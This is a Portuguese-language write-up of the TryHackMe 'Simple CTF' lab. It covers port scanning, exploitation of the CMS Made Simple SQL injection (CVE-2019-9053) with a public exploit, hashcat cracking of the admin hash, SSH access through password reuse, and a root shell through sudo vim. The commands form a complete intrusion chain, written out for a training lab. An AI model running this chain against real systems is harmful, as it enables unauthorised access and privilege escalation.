# TryHackMe — Simple CTF

**Plataforma:** TryHackMe
**Room:** Simple CTF (`easyctf`)
**Dificuldade:** Easy
**Categoria:** Web Exploitation / SQL Injection / Privilege Escalation

## Briefing

Room de introdução a pentest cobrindo o ciclo completo de um comprometimento: reconhecimento de serviços, enumeração web, exploração de uma vulnerabilidade conhecida em um CMS, quebra de credenciais e escalada de privilégio via configuração incorreta de `sudo`.

**Objetivo:** obter acesso inicial à máquina, capturar a user flag, escalar para root e capturar a root flag.

## Reconhecimento (Recon)

Varredura inicial de portas com Nmap:

```bash
nmap -sV <IP>
```

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
```

Duas portas abaixo de 1000 (FTP e HTTP); o serviço na porta mais alta é SSH — rodando em uma porta não padrão (2222), o que já indica que o vetor de acesso inicial provavelmente passa por ali, não pela porta 22 default.

A porta 80 respondia com a página padrão do Apache2 Ubuntu ("It works!"), sinal de que o conteúdo real da aplicação estava em algum diretório não linkado na raiz.

## Descoberta

Brute-force de diretórios com Gobuster:

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

```text
robots.txt   (Status: 200)
simple       (Status: 301) [--> http://<IP>/simple/]
```

Acessando `/simple/`, a aplicação se revelou um **CMS Made Simple**, confirmado pela string presente no HTML da página:

```text
CMS Made Simple version 2.2.8
```

Essa versão é conhecida por ser vulnerável a **CVE-2019-9053**: uma SQL Injection não autenticada no módulo `showtime2` (exposto via o módulo de News), que permite extrair dados diretamente do banco sem necessidade de login prévio.

## Exploração

Exploit público disponível via ExploitDB:

```bash
searchsploit cms made simple 2.2
searchsploit -m php/webapps/46635.py
```

O script é escrito para Python 2; convertido para Python 3 com `2to3` antes de rodar:

```bash
2to3 -w 46635.py
pip3 install termcolor --break-system-packages
python3 46635.py -u http://<IP>/simple/
```

O exploit extraiu, via SQLi cega baseada em tempo (`sleep()`), o usuário administrador e seu hash de senha:

```text
Username: mitch
Email: admin@admin.com
Salt: 1dac0d92e9fa6bb2
Password hash (MD5): 0c01f4468bd75d7a84c7eb73846e8d96
```

O CMS Made Simple usa o esquema `md5($salt . $password)`, correspondente ao **modo 20** do hashcat:

```bash
echo '0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2' > hash.txt
hashcat -m 20 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:REDACTED
```

Com usuário e senha em mãos, o acesso inicial não foi pelo painel `/admin/` do CMS, mas via SSH — reaproveitando a mesma credencial na porta não padrão identificada no Nmap:

```bash
ssh -p 2222 mitch@<IP>
```

Dentro da máquina, `sudo -l` revelou o vetor de escalada de privilégio:

```text
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

O binário `vim` com `NOPASSWD` é um clássico do [GTFOBins](https://gtfobins.github.io/gtfobins/vim/), permitindo escape direto para uma shell root:

```bash
sudo vim -c ':!/bin/sh'
```

## Flag / Resultado

**User flag:** `REDACTED`
**Root flag:** `REDACTED`

## Aprendizados

- Portas SSH em endereços não padrão (como 2222) costumam ser um sinal deliberado de que o vetor de acesso inicial passa por ali — vale sempre reconferir o Nmap antes de assumir a porta 22 default.
- Scripts antigos do ExploitDB frequentemente são escritos para Python 2; `2to3 -w <script>.py` resolve a maior parte das incompatibilidades de sintaxe rapidamente, sem precisar reinstalar um interpretador Python 2 completo.
- Nem todo esquema de hash MD5 salgado segue a mesma ordem de concatenação — `md5($pass.$salt)` (modo 10) e `md5($salt.$pass)` (modo 20) do hashcat produzem hashes diferentes para a mesma senha; vale testar ambos quando o esquema exato da aplicação não é conhecido.
- Credenciais extraídas de um serviço (nesse caso, do banco do CMS) muitas vezes são reaproveitadas em outros serviços da mesma máquina (SSH) — reuso de senha é um padrão recorrente tanto em ambientes reais quanto em CTFs.
- `sudo -l` deveria ser um dos primeiros comandos rodados após qualquer acesso inicial: binários com `NOPASSWD` são o vetor de escalada de privilégio mais comum em máquinas iniciantes, e o [GTFOBins](https://gtfobins.github.io/) é a referência padrão para saber como abusar de cada um.